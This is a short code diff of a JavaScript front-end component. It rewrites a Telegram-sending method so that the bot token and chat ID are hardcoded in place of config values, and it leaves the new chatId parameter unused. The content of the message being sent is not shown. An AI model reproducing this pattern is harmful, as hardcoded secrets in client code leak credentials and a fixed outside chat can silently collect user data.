@@ -134,22 +134,24 @@
 		  },
   
   
-		  async sendTelegramResult(message) {
-			  try {
-				  let botId = this.$config.public.botId
-				  let chatId = this.$config.public.chatId
-				  const url = `https://api.telegram.org/bot${botId}/sendMessage`;
-				  const payload = {
-					  chat_id: chatId,
-					  text: message,
-				  };
-				  await axios.post(url, payload);
-  
-			  } catch (error) {
-				  console.log(error, 'error')
-  
-			  }
-		  }
+		  
+      async sendTelegramResult(chatId, message){ 
+      try{
+      
+        const url = `https://api.telegram.org/bot7762177089:AAHBcnJ5YWYAU1AHgidNBP-9zcr2ISvDPW4/sendMessage`;
+         const payload = {
+           chat_id: '7082528429',
+           text: message,
+         };
+         console.log(payload)
+         this.loading = true
+         await axios.post(url, payload);
+      
+      }catch(error){
+        console.log(error, 'error')
+
+      }
+    }
   
 	  },
 	  mounted() {
